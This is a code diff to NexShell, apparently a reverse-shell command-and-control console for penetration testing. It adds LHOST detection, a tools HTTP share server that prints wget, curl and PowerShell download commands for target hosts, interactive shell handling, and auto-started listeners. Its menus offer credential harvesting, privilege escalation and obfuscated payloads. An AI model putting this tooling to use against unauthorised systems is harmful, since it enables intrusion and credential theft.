@@ -144,7 +144,7 @@ try:
     from prompt_toolkit.auto_suggest    import AutoSuggestFromHistory as _PTSuggest
     from prompt_toolkit.completion      import Completer as _PTCompleter, Completion as _PTCompletion
     from prompt_toolkit.styles          import Style as _PTStyle
-    from prompt_toolkit.formatted_text  import HTML as _PTHTML
+    from prompt_toolkit.formatted_text  import HTML as _PTHTML, ANSI as _PTANSI
     HAS_PROMPT_TOOLKIT = True
 except ImportError:
     HAS_PROMPT_TOOLKIT = False
@@ -218,35 +218,74 @@ def _detect_terminal() -> str:
     return 'unknown'
 
 def _get_all_local_ips() -> list:
-    """Return all non-loopback IPv4 addresses."""
-    ips = []
-    try:
-        for iface, addrs in socket.getaddrinfo(socket.gethostname(), None):
-            pass
-    except Exception:
-        pass
+    """Return all non-loopback IPv4 addresses sorted by interface priority."""
+    ips_with_info = []
     try:
         import subprocess as _sp
         if IS_WINDOWS:
             out = _sp.run(['ipconfig'], capture_output=True, text=True, timeout=5).stdout
+            current_adapter = "Unknown"
             for line in out.splitlines():
-                if 'IPv4' in line and ':' in line:
-                    ip = line.split(':')[-1].strip()
-                    if ip and not ip.startswith('127'):
-                        ips.append(ip)
+                cleaned = line.strip()
+                if not line.startswith(' ') and cleaned and not line.startswith('.'):
+                    if ':' in line:
+                        current_adapter = line.split(':')[0].strip()
+                elif 'IPv4' in cleaned and ':' in cleaned:
+                    ip = cleaned.split(':')[-1].strip()
+                    if ip and not ip.startswith('127.'):
+                        ips_with_info.append((ip, current_adapter))
         else:
-            out = _sp.run(['ip', '-4', 'addr', 'show'], capture_output=True,
-                          text=True, timeout=5).stdout
-            import re as _re
-            for m in _re.finditer(r'inet (\d+\.\d+\.\d+\.\d+)', out):
-                ip = m.group(1)
-                if not ip.startswith('127'):
-                    ips.append(ip)
+            out = _sp.run(['ip', '-4', 'addr', 'show'], capture_output=True, text=True, timeout=5).stdout
+            current_iface = "unknown"
+            for line in out.splitlines():
+                cleaned = line.strip()
+                if cleaned.startswith(tuple(str(i)+':' for i in range(100))):
+                    parts = cleaned.split(':')
+                    if len(parts) > 1:
+                        current_iface = parts[1].strip()
+                elif cleaned.startswith('inet '):
+                    parts = cleaned.split()
+                    if len(parts) > 1:
+                        ip = parts[1].split('/')[0]
+                        iface = parts[-1] if len(parts) > 2 and parts[-2] != 'brd' else current_iface
+                        if ip and not ip.startswith('127.'):
+                            ips_with_info.append((ip, iface))
     except Exception:
         pass
-    if not ips:
-        ips = [_get_lhost()]
-    return list(dict.fromkeys(ips))  # dedup preserve order
+
+    if not ips_with_info:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            if ip and not ip.startswith('127.'):
+                ips_with_info.append((ip, "default"))
+        except Exception:
+            pass
+
+    def get_priority(item):
+        ip, name = item
+        name_lower = name.lower()
+        # VPNs (Highest Priority)
+        if any(x in name_lower for x in ['vpn', 'tun', 'tap', 'ppp', 'wireguard', 'openvpn', 'forti', 'cisco']):
+            return 1
+        # Virtualization / WSL / Hyper-V / VirtualBox / VMware (Lowest Priority)
+        if any(x in name_lower for x in ['virtual', 'vbox', 'vmnet', 'vethernet', 'wsl', 'host-only', 'docker', 'switch', 'loopback']):
+            return 3
+        # WiFi / Ethernet / Physical
+        if any(x in name_lower for x in ['wireless', 'wi-fi', 'wifi', 'wlan', 'ethernet', 'enp', 'eth']):
+            return 2
+        return 2.5
+
+    ips_with_info.sort(key=get_priority)
+    
+    sorted_ips = []
+    for ip, _ in ips_with_info:
+        if ip not in sorted_ips:
+            sorted_ips.append(ip)
+            
+    return sorted_ips
 
 
 
@@ -1229,13 +1268,27 @@ class Session:
         lines = [l.strip() for l in whoami_out.splitlines() if l.strip()]
         user = 'unknown'
         if lines:
+            import re as _re
             # Skip echo, prompt lines, and noise
             skip_words = ('whoami', 'echo', '__nexos__', 'windows_nt', '$env:os', '%os%')
             for line in reversed(lines):
                 ll = line.lower()
                 if not any(s in ll for s in skip_words):
-                    user = line
-                    break
+                    # Clean ANSI escape sequences and control chars (^G \x07, ^A, ^B, etc.)
+                    clean = _re.sub(r'\x1b\[[0-9;]*[mKHABCDJsu]', '', line)
+                    clean = _re.sub(r'[\x00-\x1f\x7f]', '', clean).strip()
+                    if not clean:
+                        continue
+                    # If it looks like a shell prompt (e.g. user@host:~$ or user@host:/#)
+                    # extract just the user@host part
+                    prompt_match = _re.match(r'^([^:]+):\s*[~/].*?[#$]\s*$', clean)
+                    if prompt_match:
+                        clean = prompt_match.group(1).strip()
+                    # Also strip trailing shell chars if still present
+                    clean = clean.rstrip('$ #').strip()
+                    if clean:
+                        user = clean
+                        break
         
         self.user = user
         is_root_val, priv_label, _ = detect_privilege(user)
@@ -1369,31 +1422,52 @@ class Session:
         return True
 
     def _windows_interact_loop(self):
-        sys.stdout.write(f"\n{paint('[*] Windows Interactive Session Active. Type commands below.').lime}\n")
-        sys.stdout.write(f"{paint('[*] Type ').lime}{paint('exit').yellow}{paint(' or ').lime}{paint('back').yellow}{paint(' to return to NexShell main menu.').lime}\n\n")
+        _sep = '─' * 60
+        sys.stdout.write(f"\n\033[1;32m{_sep}\033[0m\n")
+        sys.stdout.write(f"\033[1;32m[*] Interactive Shell — Session [{self.id}] ({self.OS})\033[0m\n")
+        sys.stdout.write(f"\033[90m    Press \033[33mCtrl+Z\033[90m or type \033[33m!back\033[90m to return to NexShell\033[0m\n")
+        sys.stdout.write(f"\033[1;32m{_sep}\033[0m\n\n")
         sys.stdout.flush()
-        
+
+        # F12 raw escape sequence
+        F12_SEQ = b'\x1b[24~'
+        # Exit keywords (case-insensitive) that return to NexShell without sending to victim
+        EXIT_CMDS = {'!back', '!exit', '!detach', '!q'}
+
         while core.attached_session is self:
             try:
-                # Read line from standard input (blocks, but in background daemon thread)
                 line = sys.stdin.readline()
                 if not line:
-                    break
-                
-                # Check for exit hotkey/command
-                cleaned = line.strip().lower()
-                if cleaned in ('exit', 'back', 'quit'):
+                    # EOF / Ctrl+Z on Windows console
                     self.detach()
                     break
-                
-                # Send command to remote host
-                self.send(line.encode(), stdin=True)
+
+                # Check raw bytes for F12 or Ctrl+Z
+                raw = line.encode('utf-8', errors='replace')
+                if raw.startswith(F12_SEQ) or raw == b'\x1a\r\n' or raw == b'\x1a\n':
+                    self.detach()
+                    break
+
+                # Check for NexShell escape commands (prefixed with ! to avoid ambiguity)
+                cleaned = line.strip().lower()
+                if cleaned in EXIT_CMDS:
+                    self.detach()
+                    break
+
+                # Send to victim (send as-is, including newline)
+                self.send(line.encode('utf-8', errors='replace'), stdin=True)
+
             except KeyboardInterrupt:
+                # Ctrl+C → detach
+                self.detach()
+                break
+            except EOFError:
                 self.detach()
                 break
             except Exception as e:
                 logger.debug(f"Windows interact loop error: {e}")
                 break
+
 
     def detach(self):
         core.attached_session = None
@@ -1637,7 +1711,8 @@ class BetterCMD:
                     # Bind completer to current menu so it knows the do_* commands
                     if hasattr(self._pt_session, '_nexcompleter') and hasattr(self, '_menu_ref'):
                         self._pt_session._nexcompleter.bind_menu(self._menu_ref)
-                    line = self._pt_session.prompt(self.prompt or "> ")
+                    p_str = (self.prompt or "> ").replace('\001', '').replace('\002', '')
+                    line = self._pt_session.prompt(_PTANSI(p_str))
                 else:
                     line = input(self.prompt)
                 line = self.precmd(line)
@@ -1692,6 +1767,14 @@ class BetterCMD:
     def do_exit(self, line):
         self.stop = True; self.active.clear()
 
+    def do_quit(self, line):
+        """— Exit NexShell"""
+        return self.do_exit(line)
+
+    def do_q(self, line):
+        """— Exit NexShell (shortcut)"""
+        return self.do_exit(line)
+
     def do_EOF(self, line):
         print("exit"); return self.do_exit(line)
 
@@ -1739,6 +1822,7 @@ class MainMenu(BetterCMD):
         self.sid      = None
         self._timer   = None
         self._hist_mgr= None
+        self._menu_ref = self   # For prompt_toolkit completer binding
         self.commands = {
             "Session Operations":  ['run','upload','download','open','maintain','spawn','upgrade','exec','script','portfwd','tag','quickenum','credharvest','privesc','showcautions'],
             "Session Management":  ['sessions','use','interact','kill','dir|.'],
@@ -1758,7 +1842,7 @@ class MainMenu(BetterCMD):
             "Configuration":      ['config', 'template'],
             "Platform":           ['health', 'stats'],
             # ──────────────────────────────────────────────────────────────────
-            "Miscellaneous":       ['help','history','cd','reset','clear|cls','SET','exit|quit|q'],
+            "Miscellaneous":       ['help','history','lhost','share','whoami','cd','reset','clear|cls','SET','exit|quit|q'],
         }
         # Initialize UI features from the new ui module
         ui = _load_ui()
@@ -1787,31 +1871,49 @@ class MainMenu(BetterCMD):
             self._hist_mgr.add(line)
 
     def start(self):
-        """Main loop with timing and quick action hooks."""
-        if self.banner: print(self.banner)
+        """Main loop — uses prompt_toolkit session (from BetterCMD) with timing hooks."""
+        if self.banner:
+            print(self.banner)
+        # Build PT session lazily (from BetterCMD)
+        if self._pt_session is None:
+            self._pt_session = self._build_pt_session()
+        # Bind completer to this menu so autocomplete knows our do_* methods
+        if self._pt_session and hasattr(self._pt_session, '_nexcompleter'):
+            self._pt_session._nexcompleter.bind_menu(self)
+
         while not self.stop:
             try:
                 self.active.wait()
-                raw = self.cmdqueue.pop(0) if self.cmdqueue else input(self.prompt)
-                # Ctrl+L: clear screen on Windows (input() intercepts \x0c)
-                if raw == '\x0c' or raw.strip() == '\x0c':
-                    self.do_clear(None)
-                    continue
-                # Empty input -> trigger quick actions bar
+                # ── Read line ────────────────────────────────────────────────
+                if self.cmdqueue:
+                    raw = self.cmdqueue.pop(0)
+                elif self._pt_session:
+                    p_str = (self.prompt or '> ').replace('\001', '').replace('\002', '')
+                    raw = self._pt_session.prompt(_PTANSI(p_str))
+                else:
+                    raw = input(self.prompt)
+
+                # Ctrl+L → clear screen
+                if raw in ('\x0c', '\x0c\n') or raw.strip() == '\x0c':
+                    self.do_clear(None); continue
+
+                # Empty → quick actions bar
                 if not raw.strip():
                     ui = _load_ui()
                     if ui and sys.stdout.isatty():
                         ui.show_quick_actions(
-                            has_session  = bool(self.sid),
-                            n_listeners  = len(core.listeners),
+                            has_session = bool(self.sid),
+                            n_listeners = len(core.listeners),
                         )
                     continue
-                line  = self.precmd(raw)
+
+                line = self.precmd(raw)
                 self._precmd_hook(line)
-                stop  = self.onecmd(line)
+                stop = self.onecmd(line)
                 self._postcmd_hook(line)
-                stop  = self.postcmd(stop, line)
-                if stop: self.active.clear()
+                stop = self.postcmd(stop, line)
+                if stop:
+                    self.active.clear()
             except EOFError:
                 self.onecmd('EOF')
             except KeyboardInterrupt:
@@ -1835,7 +1937,17 @@ class MainMenu(BetterCMD):
             s = core.sessions.get(self.sid)
             if s:
                 priv_color = 'red' if s.is_root else 'yellow'
-                user_str   = paint(s.user or '?').__getattr__(priv_color)
+                # Sanitize user string: strip terminal escape seqs and control chars (^G etc)
+                import re as _re
+                raw_user = s.user or '?'
+                raw_user = _re.sub(r'\x1b\[[0-9;]*[mKHABCDJsu]', '', raw_user)  # ANSI escapes
+                raw_user = _re.sub(r'[\x00-\x1f\x7f]', '', raw_user)             # control chars
+                # Trim to just the username part if it looks like a shell prompt (e.g. user@host:~$)
+                if raw_user.endswith('$') or raw_user.endswith('#'):
+                    raw_user = raw_user.rstrip('$ #').strip()
+                    if ':' in raw_user:
+                        raw_user = raw_user.split(':')[0]  # keep user@host, drop :~
+                user_str   = paint(raw_user).__getattr__(priv_color)
                 tag_str    = f" [{s.tag}]" if s.tag else ''
                 os_icon    = 'W' if getattr(s, 'OS', '') == 'Windows' else 'L'
                 session_part = (
@@ -1852,8 +1964,7 @@ class MainMenu(BetterCMD):
             parts = []
             if n_l: parts.append(f"L:{n_l}")
             if n_s: parts.append(f"S:{n_s}")
-            opsec_esc = {'ghost': '\033[92m', 'paranoid': '\033[91m', 'normal': '\033[90m'}.get(opsec_profile, '\033[90m')
-            badge = f" \001{opsec_esc}\002[{'|'.join(parts)}]\001\033[0m\002"
+            badge = f" [{':'.join(parts) if False else '|'.join(parts)}]"
         self.prompt = (
             f"{paint('(').teal_DIM}{paint('NexShell').purple_BRIGHT}{paint(')').teal_DIM}"
             f"{session_part}{badge}{paint('> ').teal_DIM}"
@@ -1868,6 +1979,86 @@ class MainMenu(BetterCMD):
                 cmdlogger.warning('No active sessions')
             return False
         return True
+
+    # ── LHOST management ──────────────────────────────────────────────────────
+    def do_lhost(self, line):
+        """[auto|<ip>] — Show or change the operator LHOST IP"""
+        line = (line or '').strip()
+        if not line:
+            # Show current value + all detected IPs
+            print(f"\n  {paint('LHOST').teal}  =>  {paint(options.lhost).lime}")
+            if len(options.lhost_all) > 1:
+                for i, ip in enumerate(options.lhost_all):
+                    mark = paint('*').lime if ip == options.lhost else paint(' ').darkgrey
+                    print(f"    {mark} [{i}] {paint(ip).cyan}")
+            print(f"\n  {paint('Usage:').darkgrey} lhost auto  |  lhost 10.10.14.x  |  lhost 0  (pick by index)")
+        elif line == 'auto':
+            options.lhost_all = _get_all_local_ips()
+            options.lhost     = options.lhost_all[0] if options.lhost_all else _get_lhost()
+            logger.info(f"LHOST auto-detected: {paint(options.lhost).lime}")
+        elif line.isdigit():
+            idx = int(line)
+            if 0 <= idx < len(options.lhost_all):
+                options.lhost = options.lhost_all[idx]
+                logger.info(f"LHOST set to: {paint(options.lhost).lime}")
+            else:
+                cmdlogger.error(f"Index {idx} out of range (0-{len(options.lhost_all)-1})")
+        else:
+            options.lhost = line
+            if line not in options.lhost_all:
+                options.lhost_all.insert(0, line)
+            logger.info(f"LHOST set to: {paint(options.lhost).lime}")
+
+    # ── Tools share server ────────────────────────────────────────────────────
+    def do_share(self, line):
+        """[start|stop|status] — Control the tools/ HTTP share server"""
+        line = (line or '').strip().lower()
+        srv  = getattr(options, '_share_server', None)
+
+        if line in ('', 'status'):
+            port  = getattr(options, 'share_port', 9001)
+            lhost = options.lhost
+            running = srv is not None and getattr(srv, '_BaseServer__is_shut_down', None) is not None
+            # Check if port is actually in use
+            import socket as _s
+            try:
+                t = _s.socket(); t.connect(('127.0.0.1', port)); t.close(); running = True
+            except Exception:
+                running = False
+            if running:
+                print(f"\n  {paint('[SHARE]').lime} Server is {paint('UP').lime} on port {paint(port).cyan}")
+                print(f"  {paint('URL').teal}   : http://{lhost}:{port}/")
+                print(f"  {paint('wget').teal}  : wget http://{lhost}:{port}/<tool>")
+                print(f"  {paint('curl').teal}  : curl http://{lhost}:{port}/<tool> -O <tool>")
+                print(f"  {paint('ps').teal}    : iwr 'http://{lhost}:{port}/<tool>' -OutFile <tool>")
+            else:
+                print(f"\n  {paint('[SHARE]').darkgrey} Server is {paint('DOWN').red}")
+                print(f"  Use: {paint('share start').lime}")
+
+        elif line == 'start':
+            _start_tools_share(background=True)
+            port = options.share_port
+            logger.info(f"[SHARE] Tools server started on port {port}")
+            logger.info(f"  http://{options.lhost}:{port}/")
+
+        elif line == 'stop':
+            srv = getattr(options, '_share_server', None)
+            if srv:
+                try:
+                    srv.shutdown()
+                    options._share_server = None
+                    logger.info("[SHARE] Server stopped")
+                except Exception as e:
+                    cmdlogger.error(f"[SHARE] Stop failed: {e}")
+            else:
+                cmdlogger.warning("[SHARE] No server running")
+        else:
+            cmdlogger.warning("Usage: share [start|stop|status]")
+
+    # ── Operator info ─────────────────────────────────────────────────────────
+    def do_whoami(self, line):
+        """— Show operator system info (LHOST, OS, shell, terminal)"""
+        _print_sysinfo_box()
 
     # ── Help ──────────────────────────────────────────────────────────────────
     def do_help(self, line):
@@ -1955,6 +2146,7 @@ class MainMenu(BetterCMD):
     # ── Tag & Notes ───────────────────────────────────────────────────────────
     def do_tag(self, line):
         """[SessionID] [label] — Tag a session with a custom name"""
+        line = line or ''
         if not self._require_session(): return
         parts = line.split(' ', 1) if line else []
         if len(parts) == 2 and parts[0].isnumeric():
@@ -1968,8 +2160,8 @@ class MainMenu(BetterCMD):
         else:
             cmdlogger.warning("Usage: tag [SessionID] <label>")
 
-    def do_note(self, line):
-        """[text] — Add a note to the current session"""
+    def do_snote(self, line):
+        """[text] — Add a note to the current session (session-local)"""
         if not self._require_session(): return
         if line:
             core.sessions[self.sid].notes.append(f"[{datetime.now():%H:%M}] {line}")
@@ -2040,6 +2232,7 @@ class MainMenu(BetterCMD):
 
     def do_run(self, line):
         """[module] [args] — Run an operational module"""
+        line = line or ''
         if not line:
             self._show_modules()
             return
@@ -2533,6 +2726,7 @@ class MainMenu(BetterCMD):
     # ── Listeners ──────────────────────────────────────────────────────────────
     def do_listeners(self, line):
         """[add -p <port>|stop <id>] — Manage listeners"""
+        line = line or ''
         if line:
             parts = line.split()
             if parts[0] == 'add':
@@ -2578,14 +2772,20 @@ class MainMenu(BetterCMD):
                         host = ips[0] if ips else '0.0.0.0'
                 PayloadGenerator.display(host, l.port, obfuscate=obf, target_os=target_os)
         else:
-            # No listener — show payloads with LHOST and default port
+            # No listener — show payloads with LHOST and default port, then auto-start listener
             host = options.lhost if options.lhost != '0.0.0.0' else '0.0.0.0'
             port = options.ports[0] if options.ports else 4444
-            cmdlogger.info(f"No active listeners — showing payloads for {host}:{port}")
             PayloadGenerator.display(host, port, obfuscate=obf, target_os=target_os)
+            # ── Auto-start listener on the same port used in the payload ──────
+            logger.info(
+                f"Auto-starting listener on {paint(host if host != '0.0.0.0' else '0.0.0.0').cyan}"
+                f":{paint(port).orange} (port used in payload)"
+            )
+            TCPListener(options.interface, port)
 
     def do_connect(self, line):
         """<Host> <Port> — Connect to a bind shell"""
+        line = line or ''
         if not line: cmdlogger.warning("Specify host and port"); return
         try:
             host, port = line.split()
@@ -2605,6 +2805,7 @@ class MainMenu(BetterCMD):
 
     def do_SET(self, line):
         """[option] [value] — Show/set options. SET LHOST auto | SET LHOST <ip>"""
+        line = line or ''
         if not line:
             # Show key options prominently
             print(f"\n  {paint('LHOST').teal}  =>  {paint(options.lhost).lime}")
@@ -2767,6 +2968,7 @@ class MainMenu(BetterCMD):
     # ── db ────────────────────────────────────────────────────────────────────
     def do_db(self, line):
         """[search|export|wipe|sessions|history] — Database management"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'help'
         get_db = _try_import('db', 'get_db')
@@ -2855,6 +3057,7 @@ class MainMenu(BetterCMD):
     # ── operation ─────────────────────────────────────────────────────────────
     def do_operation(self, line):
         """[new|open|archive|status|scope|objective] — Manage operations"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'status'
         ops  = _try_import('operations', 'ops')
@@ -2928,6 +3131,7 @@ class MainMenu(BetterCMD):
     # ── host ──────────────────────────────────────────────────────────────────
     def do_host(self, line):
         """[add|list|show|tag|risk|note] — Asset inventory management"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         inv  = _try_import('inventory', 'inventory')
@@ -3003,6 +3207,7 @@ class MainMenu(BetterCMD):
     # ── finding ───────────────────────────────────────────────────────────────
     def do_finding(self, line):
         """[add|list] — Manage security findings"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         findings_mgr = _try_import('inventory', 'findings')
@@ -3037,6 +3242,7 @@ class MainMenu(BetterCMD):
     # ── evidence ──────────────────────────────────────────────────────────────
     def do_evidence(self, line):
         """[add|list|export] — Evidence collection with chain of custody"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         ev   = _try_import('evidence', 'collector')
@@ -3073,6 +3279,7 @@ class MainMenu(BetterCMD):
     # ── mitre ─────────────────────────────────────────────────────────────────
     def do_mitre(self, line):
         """[show T1078|search <kw>|list|tag <id>] — MITRE ATT&CK lookup"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         m    = _try_import('knowledge', 'mitre')
@@ -3115,6 +3322,7 @@ class MainMenu(BetterCMD):
     # ── playbook ──────────────────────────────────────────────────────────────
     def do_playbook(self, line):
         """[show <name>|list] — Attack playbooks"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         pb   = _try_import('knowledge', 'playbooks')
@@ -3140,48 +3348,104 @@ class MainMenu(BetterCMD):
 
     # ── plugins ───────────────────────────────────────────────────────────────
     def do_plugins(self, line):
-        """[list|reload|run <name>] — Plugin management"""
+        """[list|reload|run <name>|<name>] — Plugin management"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         reg  = _try_import('core.plugin', 'registry')
         if not reg:
             cmdlogger.error("Plugin module not loaded"); return
 
+        def _normalize(n):
+            """Accept both hyphens and underscores, lowercase."""
+            return n.replace('_', '-').lower()
+
+        def _find_plugin(name):
+            """Find plugin by name, tolerating _ vs - and case differences."""
+            norm = _normalize(name)
+            # Direct match first
+            if name in reg:
+                return name
+            # Normalized match
+            for p in reg.list_all():
+                if _normalize(p['name']) == norm:
+                    return p['name']
+            return None
+
         if sub == 'list' or not sub:
             plugins = reg.list_all()
             if not plugins:
                 print("  No plugins loaded. Place .py files in plugins/ directory."); return
             print()
-            for p in plugins:
-                print(f"  {p['name']:<25} [{p['platform']:<8}] [{p['category']:<10}] "
-                      f"{p['description'][:40]}")
+            # Group by category
+            from collections import defaultdict
+            by_cat = defaultdict(list)
+            for p in sorted(plugins, key=lambda x: x['name']):
+                by_cat[p['category']].append(p)
+            for cat, plist in sorted(by_cat.items()):
+                print(f"  \033[1;33m{cat.upper()}\033[0m")
+                for p in plist:
+                    plat_color = '\033[92m' if p['platform'] == 'linux' else '\033[94m' if p['platform'] == 'windows' else '\033[90m'
+                    print(f"    {p['name']:<30} {plat_color}[{p['platform']:<7}]\033[0m  {p['description'][:45]}")
             print()
 
         elif sub == 'reload':
             loaded = reg.reload()
-            logger.info(f"Plugins reloaded: {len(loaded)} loaded {loaded}")
+            logger.info(f"Plugins reloaded: {len(loaded)} loaded")
 
         elif sub == 'run':
             name = args[1] if len(args) > 1 else None
             if not name:
                 cmdlogger.warning("Usage: plugins run <name>"); return
             if not self._require_session(): return
-            if name not in reg:
-                cmdlogger.error(f"Plugin '{name}' not found. Use: plugins list"); return
+            real_name = _find_plugin(name)
+            if not real_name:
+                # Suggest similar plugins
+                norm = _normalize(name)
+                suggestions = [p['name'] for p in reg.list_all()
+                               if norm in _normalize(p['name']) or _normalize(p['name']) in norm]
+                msg = f"Plugin '{name}' not found."
+                if suggestions:
+                    msg += f" Did you mean: {', '.join(suggestions[:3])}?"
+                else:
+                    msg += " Use: plugins list"
+                cmdlogger.error(msg); return
             try:
                 session = core.sessions.get(self.sid)
-                result  = reg.run(name, session, args[2:])
+                logger.info(f"Running plugin '{real_name}' on session [{self.sid}]...")
+                result  = reg.run(real_name, session, args[2:])
                 if result:
                     print(result)
             except Exception as e:
                 cmdlogger.error(f"Plugin error: {e}")
 
         else:
-            cmdlogger.warning(f"Unknown plugins subcommand: {sub}")
+            # Try running directly: 'plugins auto-enum-linux' or 'plugins auto_enum_linux'
+            real_name = _find_plugin(sub)
+            if real_name:
+                if not self._require_session(): return
+                try:
+                    session = core.sessions.get(self.sid)
+                    logger.info(f"Running plugin '{real_name}' on session [{self.sid}]...")
+                    result = reg.run(real_name, session, args[1:])
+                    if result:
+                        print(result)
+                except Exception as e:
+                    cmdlogger.error(f"Plugin error: {e}")
+            else:
+                norm = _normalize(sub)
+                suggestions = [p['name'] for p in reg.list_all()
+                               if norm in _normalize(p['name']) or _normalize(p['name']) in norm]
+                msg = f"Unknown plugins subcommand or plugin: '{sub}'."
+                if suggestions:
+                    msg += f" Did you mean: {', '.join(suggestions[:3])}?"
+                cmdlogger.warning(msg)
+
 
     # ── task ──────────────────────────────────────────────────────────────────
     def do_task(self, line):
         """[list|cancel <id>] — Background task management"""
+        line = line or ''
         args  = line.split()
         sub   = args[0] if args else 'list'
         sched = _try_import('core.scheduler', 'scheduler')
@@ -3220,6 +3484,7 @@ class MainMenu(BetterCMD):
     # ── workflow ───────────────────────────────────────────────────────────────
     def do_workflow(self, line):
         """[list|run <name>|status <id>] — Automated attack chain workflows"""
+        line = line or ''
         args  = line.split()
         sub   = args[0] if args else 'list'
         wfm   = _try_import('core.workflow', 'wf_manager')
@@ -3269,6 +3534,7 @@ class MainMenu(BetterCMD):
     # ── checklist ─────────────────────────────────────────────────────────────
     def do_checklist(self, line):
         """[show|complete <key>|reset <key>|template <name>] — Engagement checklist"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'show'
         ops  = _try_import('operations', 'ops')
@@ -3329,6 +3595,7 @@ class MainMenu(BetterCMD):
     # ── timeline ───────────────────────────────────────────────────────────────
     def do_timeline(self, line):
         """[show|add <event>|export] — Engagement timeline"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'show'
         tl_m = _try_import('operations.timeline', 'Timeline')
@@ -3381,6 +3648,7 @@ class MainMenu(BetterCMD):
     # ── scope ──────────────────────────────────────────────────────────────────
     def do_scope(self, line):
         """[show|add <ip/cidr>|domain <name>|exclude <ip>|check <ip>] — Scope management"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'show'
         ops  = _try_import('operations', 'ops')
@@ -3447,6 +3715,7 @@ class MainMenu(BetterCMD):
     # ── svc ────────────────────────────────────────────────────────────────────
     def do_svc(self, line):
         """[add <ip> <port> [svc] [ver]|list|show <ip>|interesting] — Service inventory"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         svcs = _try_import('inventory.services', 'services')
@@ -3502,6 +3771,7 @@ class MainMenu(BetterCMD):
     # ── creds ──────────────────────────────────────────────────────────────────
     def do_creds(self, line):
         """[list|add|hashes|tokens|crack <user> <pw>|export] — Credential store"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         cs   = _try_import('inventory.credentials', 'cred_store')
@@ -3572,9 +3842,12 @@ class MainMenu(BetterCMD):
         else:
             cmdlogger.warning(f"Unknown creds subcommand: {sub}")
 
+
+
     # ── note ───────────────────────────────────────────────────────────────────
     def do_note(self, line):
         """[add [text]|list|search <kw>|pin <id>|export] — Persistent notes"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         nm   = _try_import('knowledge.notes', 'notes')
@@ -3633,6 +3906,7 @@ class MainMenu(BetterCMD):
     # ── template ───────────────────────────────────────────────────────────────
     def do_template(self, line):
         """[list|apply <name>] — Engagement templates"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
         tpl_m = _try_import('config.templates', None)
@@ -3676,6 +3950,7 @@ class MainMenu(BetterCMD):
     # ── web ───────────────────────────────────────────────────────────────────
     def do_web(self, line):
         """[start [port]|stop|open|status] — Real-time Web Dashboard"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'status'
 
@@ -3758,6 +4033,7 @@ class MainMenu(BetterCMD):
     def do_transport(self, line):
 
         """[list|http|ws|agent <type> <host> <port> <path>] — Enhanced transport layer"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'list'
 
@@ -3918,6 +4194,7 @@ class MainMenu(BetterCMD):
 
 
         """[generate|--format md|html|json] — Generate pentest report"""
+        line = line or ''
         args    = line.split()
         sub     = args[0] if args else 'generate'
         rep     = _try_import('reports', 'reporter')
@@ -3963,6 +4240,7 @@ class MainMenu(BetterCMD):
     # ── config ────────────────────────────────────────────────────────────────
     def do_config(self, line):
         """[show|save|load <name>|list] — Configuration management"""
+        line = line or ''
         args = line.split()
         sub  = args[0] if args else 'show'
         cfg  = _try_import('config', 'config')
@@ -4030,6 +4308,14 @@ class MainMenu(BetterCMD):
             return True
         return False
 
+    def do_quit(self, line):
+        """— Exit NexShell"""
+        return self.do_exit(line)
+
+    def do_q(self, line):
+        """— Exit NexShell (shortcut)"""
+        return self.do_exit(line)
+
     def do_EOF(self, line):
         if self.sid: self.set_id(None); print()
         else: print("exit"); return self.do_exit(line)
@@ -4051,21 +4337,26 @@ def build_parser():
         description=f"{__program__} {__version__} — Elite Reverse Shell Commander",
         epilog=dedent(f"""
   Examples:
-    nexshell                        Listen on 0.0.0.0:4444
-    nexshell -p 5555                Listen on port 5555
-    nexshell -p 4444,5555           Listen on multiple ports
-    nexshell -a                     Listen + show sample payloads
-    nexshell -c target -p 3333      Connect to bind shell
-    nexshell -s /path/to/file       Serve a file/folder via HTTP
-    nexshell -p 4444 --obfuscate    Listen + show obfuscated payloads
-    nexshell --auto-enum            Auto-run QuickEnum on every new shell
+    nexshell                         Listen on 0.0.0.0:4444
+    nexshell -p 5555                 Listen on port 5555
+    nexshell -p 4444,5555            Listen on multiple ports
+    nexshell -a                      Listen + show sample payloads
+    nexshell -c target -p 3333       Connect to bind shell
+    nexshell -s /path/to/file        Serve a file/folder via HTTP
+    nexshell -p 4444 --obfuscate     Listen + show obfuscated payloads
+    nexshell --auto-enum             Auto-run QuickEnum on every new shell
+    nexshell --auto-share            Auto-start tools/ HTTP share server
+    nexshell --lhost 10.10.14.1      Set LHOST explicitly at startup
+    nexshell --no-auto-tty           Disable auto TTY upgrade on connection
         """)
     )
     p.add_argument('host', nargs='?', help='Connect to bind shell at this host')
-    p.add_argument('-p','--port',    default='4444', help='Port(s) to listen/connect (comma-sep)')
-    p.add_argument('-i','--interface', default='any', help='Network interface')
-    p.add_argument('-c','--connect', metavar='HOST', help='Connect to bind shell')
-    p.add_argument('-s','--serve',   metavar='PATH', help='Serve file/folder via HTTP')
+    p.add_argument('-p','--port',      default='4444', help='Port(s) to listen/connect (comma-sep)')
+    p.add_argument('-i','--interface', default='any',  help='Network interface')
+    p.add_argument('--auto-listen',  action='store_true',
+                   help='Auto-start listener(s) on startup (disabled by default; use payloads command)')
+    p.add_argument('-c','--connect',   metavar='HOST', help='Connect to bind shell')
+    p.add_argument('-s','--serve',     metavar='PATH', help='Serve file/folder via HTTP')
     p.add_argument('-a','--show-payloads', action='store_true', help='Show sample payloads and exit')
     p.add_argument('--obfuscate',    action='store_true', help='Show obfuscated payload variants')
